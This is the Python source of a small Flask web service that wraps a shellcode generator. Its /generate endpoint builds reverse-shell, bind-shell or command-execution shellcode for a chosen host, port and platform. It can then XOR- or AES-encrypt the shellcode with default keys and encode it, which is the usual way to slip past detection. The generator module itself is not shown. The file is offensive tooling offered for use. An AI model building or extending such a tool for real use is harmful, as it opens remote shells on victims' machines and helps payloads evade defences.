from flask import Flask, render_template, request, jsonify
from modules.shellcode_generator import ShellcodeGenerator
import os

app = Flask(__name__)
shellcode_gen = ShellcodeGenerator()

@app.route('/')
def index():
    return render_template('shellcode.html')

@app.route('/generate', methods=['POST'])
def generate_shellcode():
    try:
        data = request.get_json()
        shellcode_type = data.get('type')
        platform = data.get('platform', 'windows')
        encoding = data.get('encoding', 'base64')
        encryption = data.get('encryption', 'none')
        key = data.get('key', '')
        shellcode = None

        if shellcode_type == 'reverse_shell':
            host = data.get('host')
            port = data.get('port')

            if not host or not port:
                return jsonify({'error': 'Host and port are required for reverse shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be an integer'}), 400

            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)

        elif shellcode_type == 'bind_shell':
            port = data.get('port')

            if not port:
                return jsonify({'error': 'Port is required for bind shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be an integer'}), 400

            shellcode = shellcode_gen.generate_bind_shell(port, platform)

        elif shellcode_type == 'exec':
            command = data.get('command')

            if not command:
                return jsonify({'error': 'Command is required for exec shellcode'}), 400

            shellcode = shellcode_gen.generate_exec(command, platform)

        else:
            return jsonify({'error': 'Invalid shellcode type'}), 400

        if shellcode is None:
            return jsonify({'error': 'Failed to generate shellcode'}), 500

        # Apply encryption if needed
        if encryption != 'none':
            if encryption == 'xor':
                shellcode = shellcode_gen.xor_encrypt(shellcode, key or 'defaultxor')
            elif encryption == 'aes':
                shellcode = shellcode_gen.aes_encrypt(shellcode, key or 'defaultaes')

        # Encode shellcode
        encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
        if encoded_shellcode is None:
            return jsonify({'error': 'Failed to encode shellcode'}), 500

        return jsonify({
            'success': True,
            'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode,
            'encoding': encoding
        })

    except Exception as e:
        return jsonify({'error': f'Unexpected server error: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
